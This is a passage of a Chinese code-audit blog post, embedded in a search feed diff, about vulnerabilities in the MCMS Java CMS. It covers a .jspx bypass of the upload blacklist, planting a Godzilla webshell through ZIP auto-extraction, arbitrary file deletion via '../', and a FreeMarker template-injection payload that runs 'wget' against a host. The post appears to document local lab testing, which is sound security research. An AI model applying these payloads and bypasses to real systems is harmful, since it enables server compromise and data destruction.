+<p><code>uploadFileDenied</code> 获取配置文件的中后缀名赋给 errType 是黑名单 ，而这里只获取了 <code>.exe</code> 和 <code>.jsp</code> , 继续跟代码，查看是否有做二次验证。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4g3qsxzxj31ch0u0wkr.jpg" alt="image-20220207040500781"></p>
+<p>后续并没有进行二次验证，在 40 行截取上传文件后缀名,在 59 行，<code>System.currentTimeMillis()</code> 生成一段14位的随机数和后缀名拼接组成新的文件名 ，并在 66 行循环对比后缀名是否和黑名单中相匹配。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4g3s8qapj31ay0u010x.jpg" alt="image-20220207040837052"></p>
+<p>后缀名不在黑名单后，就会执行保存操作，这段验证操作比较简单，主要是对比黑名单，而作者的黑名单后缀名过滤不够完整，用 <code>jspx</code> 即可绕过。</p>
+<h2 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>栏目管理 -&gt; 上传缩略图</p>
+<p>文件管理 -&gt; 上传缩略图</p>
+<p>系统设置 -&gt; 网站LOGO</p>
+<p>均调用 <code>upload</code> 代码，只是上传目录不同。</p>
+<p>上传 <code>jspx</code> 文件，跟踪调用链</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4g3ocyw9j317m0u0qb1.jpg" alt="image-20220207042154698"></p>
+<p>可以看见 <code>jspx</code> 成功上传</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4g3nmhfaj31b00d8abp.jpg" alt="image-20220207042302204"></p>
+<h1 id="0X05-ZIP自解压-上传webshell"><a href="#0X05-ZIP自解压-上传webshell" class="headerlink" title="0X05 ZIP自解压(上传webshell)"></a>0X05 ZIP自解压(上传webshell)</h1><h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>ZIP文件上传点</p>
+<p><code>net/mingsoft/ms-basic/2.1.10/ms-basic-2.1.10.jar!/net/mingsoft/basic/action/ManageFileAction.class</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4ki4hav7j31z60lg42s.jpg" alt="image-20220207061612143"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4ki05w5bj31bp0u0dkw.jpg" alt="image-20220207061632642"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4ki8abe3j31y70u0n2e.jpg" alt="image-20220207061645509"></p>
+<p>整个ZIP文件上传流程和前面分析的流程一致。</p>
+<p>自解压</p>
+<p><code>repository/net/mingsoft/ms-basic/2.1.10/ms-basic-2.1.10.jar!/net/mingsoft/basic/action/TemplateAction.class</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4ki2ozrxj31jt0u0td3.jpg" alt="image-20220207061809413"></p>
+<p>上传一个zip，然后抓包,上传成功后，会返回一个zip包上传路径</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4ki7hax2j31980u0n6j.jpg" alt="image-20220207062217272"></p>
+<p>随即会自动调用 unzip 解压文件，fileUrl 是我们上次的zip文件地址</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4ki8ur54j319m0u048z.jpg" alt="image-20220207062441860"></p>
+<p>断点打在 <code>unzip</code> ，也没什么复杂的处理，得到文件路径，判断路径中是否有 <code>../</code> 或 <code>..\\</code> zip文件,再根据路径获取 zip 文件。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4ki47kiuj31kx0u0wlx.jpg" alt="image-20220207063346809"></p>
+<p>unzip 解压 ， 跟进，可以发现是遍历 zip 文件中的所有文件</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4ki6n3k5j31870u07as.jpg" alt="image-20220207064705911"></p>
+<p>返回解压后的所有文件，<code>del</code> 判断是否解压，解压完成后，删除压缩包文件。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4ki57vi2j31b50u0dlz.jpg" alt="image-20220207064903950"></p>
+<p>中间也没有做任何的文件过滤，判断啥的，后缀名也是使用的黑名单，使用burp可以修改后缀名上传webshell。</p>
+<h2 id="漏洞验证-3"><a href="#漏洞验证-3" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>生成一个哥斯拉 <code>webshell</code> , 将webshell放到 zip 压缩包中 </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4ki0dov1j314w0m4q5h.jpg" alt="image-20220207065151816"></p>
+<p>上传压缩包</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4ki29d5hj31h90u0acm.jpg" alt="image-20220207065254120"></p>
+<p>访问路径</p>
+<p><code>http://localhost:8081/ms_mcms_war/template/1//default/2.jsp</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4ki1sof4j30uu0he3zq.jpg" alt="image-20220207065400015"></p>
+<p>哥斯拉连接</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4ki19kabj325k0u0jv1.jpg" alt="image-20220207065439381"></p>
+<p>绕过后缀名</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4ki376tdj31yi0s4n86.jpg" alt="image-20220207065526380"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4ki5v5jdj31b00hm0ua.jpg" alt="image-20220207065535286"></p>
+<h1 id="0X06-模板注入"><a href="#0X06-模板注入" class="headerlink" title="0X06 模板注入"></a>0X06 模板注入</h1><h2 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该CMS使用的模版引擎是freemarker，该模版引擎是存在模版注入的</p>
+<p>登录管理后台，在后台模板管理界面，是可以修改模板文件内容的</p>
+<p>编辑模块调用的是</p>
+<p><code>/net/mingsoft/ms-basic/2.1.10/ms-basic-2.1.10.jar!/net/mingsoft/basic/action/TemplateAction.class writeFileContent</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4m79z0nij31ak0u079e.jpg" alt="image-20220207071553743"></p>
+<p>可以看见这段代码中也没有对内容进行过滤，只是获取了内容，名字，然后将编辑后的内容和原内容对比，然后修改成功。</p>
+<p>生成主页</p>
+<p><code>MCMS-master/src/main/java/net/mingsoft/cms/action/GeneraterAction.java</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4m7f5353j31ay0u0gs1.jpg" alt="image-20220207073203047"></p>
+<p>跟进 <code>generate</code> 方法</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4m7c2rj1j31uj0u0q9b.jpg" alt="image-20220207074718868"></p>
+<p><code>rendering</code> 解析模板文件</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4m7h4zwzj31um0u0jz6.jpg" alt="image-20220207074829164"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4m7dzrx0j329q0j87al.jpg" alt="image-20220207074938161"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4m7baorbj31a00u0jz9.jpg" alt="image-20220207075025571"></p>
+<p>正常解析模板文件，当注入恶意代码时，漏洞被成功触发。</p>
+<h2 id="漏洞验证-4"><a href="#漏洞验证-4" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>修改模板文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">payload：  </span><br><span class="line">  &lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; </span><br><span class="line">  ${ ex("wget http://localhost:8084") }</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4m7hxj10j31d10u0te9.jpg" alt="image-20220207075222116"></p>
+<p>保存，点击内容管理 -&gt; 静态化</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4m7affnyj31ak0u079e.jpg" alt="image-20220207075342601"></p>
+<p>模板选择对应修改的文件,生成主页</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4m7cwq4fj315m0baq5f.jpg" alt="image-20220207075428602"></p>
+<p>触发成功。</p>
+<h1 id="OXO7-任意文件删除"><a href="#OXO7-任意文件删除" class="headerlink" title="OXO7 任意文件删除"></a>OXO7 任意文件删除</h1><h2 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞点</p>
+<p><code>net/mingsoft/ms-basic/2.1.10/ms-basic-2.1.10.jar!/net/mingsoft/basic/action/TemplateAction.class</code></p>
+<p><img src="image-20220207082049946.png" alt="image-20220207082049946"></p>
+<p>代码无任何过滤，获取要删除的文件名，<code>deleteDirectory</code> 执行删除</p>
+<h2 id="漏洞验证-5"><a href="#漏洞验证-5" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p><img src="image-20220207082431099.png" alt="image-20220207082431099"></p>
+<p>修改为 <code>../1</code> ， 成功删除<br><img src="image-20220207082729105.png" alt="image-20220207082729105"></p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>JAVA</tag>
       </tags>
   </entry>
 </search>
